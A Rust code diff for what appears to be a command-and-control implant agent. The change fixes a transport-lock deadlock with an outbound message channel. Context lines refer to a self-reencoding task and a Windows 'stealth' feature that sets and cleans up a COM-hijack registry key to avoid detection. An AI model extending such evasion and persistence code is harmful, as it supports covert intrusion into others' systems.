@@ -42,9 +42,15 @@ pub mod memory_guard;
 
 use anyhow::Result;
 use common::{CryptoSession, Message, Transport};
-use log::{error, info};
+use log::{error, info, warn};
 use std::sync::Arc;
 use tokio::sync::{Mutex, RwLock};
+
+/// Outbound messages are sent through an mpsc channel to a dedicated writer
+/// task that holds the transport lock.  This prevents the deadlock that occurs
+/// when the main loop holds the transport Mutex during `recv()` while a
+/// spawned command handler tries to acquire the same lock to send a response.
+const OUTBOUND_CHANNEL_CAPACITY: usize = 256;
 
 pub struct Agent {
     transport: Arc<Mutex<Box<dyn Transport + Send>>>,
@@ -360,7 +366,27 @@ impl Agent {
             info!("self-reencode background task spawned (interval={interval}s, seed=auto-derived)");
         }
 
+        // Outbound message channel: spawned command handlers push responses
+        // here instead of locking the transport directly.  The main loop
+        // drains the channel alongside recv(), preventing the deadlock that
+        // occurs when the recv()-side holds the Mutex while a spawned task
+        // waits for the same lock to send a response.
+        let (outbound_tx, mut outbound_rx) =
+            tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);
+
         loop {
+            // Drain any pending outbound messages before we block on recv().
+            // This ensures responses from the previous iteration are flushed
+            // before we re-acquire the lock to wait for the next command.
+            {
+                let mut transport = self.transport.lock().await;
+                while let Ok(msg) = outbound_rx.try_recv() {
+                    if let Err(e) = transport.send(msg).await {
+                        error!("Failed to send outbound message: {}", e);
+                    }
+                }
+            }
+
             let msg_fut = async {
                 let mut transport = self.transport.lock().await;
                 transport.recv().await
@@ -368,10 +394,20 @@ impl Agent {
 
             let msg = tokio::select! {
                 res = msg_fut => res,
+                // Also check for outbound messages while waiting for inbound.
+                // This handles the race where a response is produced just
+                // before we re-acquire the lock for recv().
+                outbound = outbound_rx.recv() => {
+                    if let Some(msg) = outbound {
+                        let mut transport = self.transport.lock().await;
+                        if let Err(e) = transport.send(msg).await {
+                            error!("Failed to send outbound message: {}", e);
+                        }
+                    }
+                    continue;
+                }
                 _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                     info!("Shutdown signal received, draining tasks and shutting down.");
-                    // Clean up the COM-hijack registry key if the stealth layer
-                    // applied it — leave no detectable artefact after exit.
                     #[cfg(all(windows, feature = "stealth"))]
                     crate::amsi_defense::cleanup_com_hijack();
                     break;
@@ -388,7 +424,7 @@ impl Agent {
                     let crypto = self.crypto.clone();
                     let config_handle = self.config.clone();
                     let command_for_sync = command.clone();
-                    let transport = self.transport.clone();
+                    let out_tx = outbound_tx.clone();
                     tasks.spawn(async move {
                         let config = Arc::new(Mutex::new(config_handle.read().await.clone()));
                         let (response, result_data, audit_event) = handlers::handle_command(
@@ -399,9 +435,6 @@ impl Agent {
                         )
                         .await;
 
-                        // handlers::handle_command expects Arc<Mutex<Config>> and
-                        // mutates it for ReloadConfig; persist those updates back
-                        // into the shared runtime config handle.
                         if matches!(command_for_sync, common::Command::ReloadConfig)
                             && response.is_ok()
                         {
@@ -410,11 +443,10 @@ impl Agent {
                             *live_cfg = updated_cfg;
                         }
 
-                        let mut t = transport.lock().await;
-                        if let Err(e) = t.send(Message::AuditLog(audit_event)).await {
-                            error!("Failed to send audit log: {}", e);
+                        if let Err(e) = out_tx.send(Message::AuditLog(audit_event)).await {
+                            warn!("Outbound channel closed, dropping audit log: {}", e);
                         }
-                        if let Err(e) = t
+                        if let Err(e) = out_tx
                             .send(Message::TaskResponse {
                                 task_id,
                                 result: response,
@@ -422,7 +454,7 @@ impl Agent {
                             })
                             .await
                         {
-                            error!("Failed to send response: {}", e);
+                            warn!("Outbound channel closed, dropping response: {}", e);
                         }
                     });
                 }
@@ -442,7 +474,7 @@ impl Agent {
                         module_name, version
                     );
                     let crypto = self.crypto.clone();
-                    let transport = self.transport.clone();
+                    let out_tx = outbound_tx.clone();
                     let name_clone = module_name.clone();
                     let ver_clone = version.clone();
                     let verify_key = self.config.read().await.module_verify_key.clone();
@@ -462,9 +494,8 @@ impl Agent {
                         let action =
                             format!("ModulePush(module={name_clone:?},version={ver_clone:?})");
                         let audit = handlers::make_audit(&action, outcome, &details, "server");
-                        let mut t = transport.lock().await;
-                        if let Err(e) = t.send(Message::AuditLog(audit)).await {
-                            error!("Failed to send ModulePush audit log: {}", e);
+                        if let Err(e) = out_tx.send(Message::AuditLog(audit)).await {
+                            warn!("Outbound channel closed, dropping ModulePush audit: {}", e);
                         }
                     });
                 }
